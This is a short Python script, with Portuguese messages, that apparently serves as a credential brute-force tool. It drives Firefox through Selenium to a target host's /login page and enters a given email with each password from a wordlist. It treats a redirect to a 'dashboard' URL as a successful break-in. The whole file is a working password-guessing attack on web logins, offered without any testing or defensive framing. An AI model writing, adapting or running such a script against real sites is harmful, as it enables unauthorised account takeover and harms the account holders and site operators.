import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

if len(sys.argv) < 3:
    print("Uso: python3 bruteforce.py <email> <url> [porta]")
    sys.exit(1)

email = sys.argv[1]
url_base = sys.argv[2]
porta = sys.argv[3] if len(sys.argv) >= 4 else "80"

url = f"http://{url_base}:{porta}/login"

print(f"Alvo: {url} | Email: {email}")

# Firefox + geckodriver
driver = webdriver.Firefox()

with open("wordlist.txt", "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

driver.get(url)

for password in passwords:
    try:
        email_input = driver.find_element(By.NAME, "email")
        password_input = driver.find_element(By.NAME, "senha")

        login_button = driver.find_element(By.XPATH, "//button[@type='button']")

        email_input.clear()
        password_input.clear()

        email_input.send_keys(email)
        password_input.send_keys(password)

        login_button.click()

        print(f"Tentando senha: {password}")

        time.sleep(2)

        if "dashboard" in driver.current_url:
            print(f"[+] Senha encontrada: {password}")
            break

    except Exception as e:
        print(f"Erro: {e}")
        break

driver.quit()
